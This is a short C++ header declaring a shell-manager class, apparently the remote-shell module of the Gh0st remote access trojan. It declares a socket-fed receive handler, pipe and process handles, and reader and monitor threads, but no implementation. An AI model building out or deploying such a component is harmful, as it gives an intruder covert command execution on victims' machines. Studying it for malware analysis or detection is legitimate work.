// ShellManager.h: interface for the CShellManager class.
//

#pragma once


#include "Manager/Manager.h"

namespace Gh0st {

	class CShellManager : public CManager  
	{
	public:
		CShellManager(CClientSocket *pClient);
		virtual ~CShellManager();
		virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	private:
		HANDLE m_hReadPipeHandle;   
		HANDLE m_hWritePipeHandle; 
		HANDLE m_hReadPipeShell;
		HANDLE m_hWritePipeShell;
	
		HANDLE m_hProcessHandle;
		HANDLE m_hThreadHandle;
		HANDLE m_hThreadRead;
		HANDLE m_hThreadMonitor;

		static DWORD WINAPI ReadPipeThread(LPVOID lparam);
		static DWORD WINAPI MonitorThread(LPVOID lparam);
	};
}